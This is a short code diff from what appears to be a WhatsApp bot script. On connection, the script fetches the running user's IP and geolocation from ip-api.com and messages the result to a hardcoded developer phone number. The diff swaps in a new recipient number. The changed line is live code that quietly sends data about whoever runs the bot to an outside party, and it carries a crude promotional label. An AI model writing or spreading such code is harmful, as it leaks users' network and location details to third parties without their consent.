@@ -43,7 +43,7 @@ denz.autoReconnect = ReconnectMode.onConnectionLost
 	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
-       denz.sendMessage("6285866295942@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Bitch Boot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/6285866295942?text=Assalamualaikum"}}})
+       denz.sendMessage("6283136262784@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Bitch Boot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/6285866295942?text=Assalamualaikum"}}})
      console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
    })
       
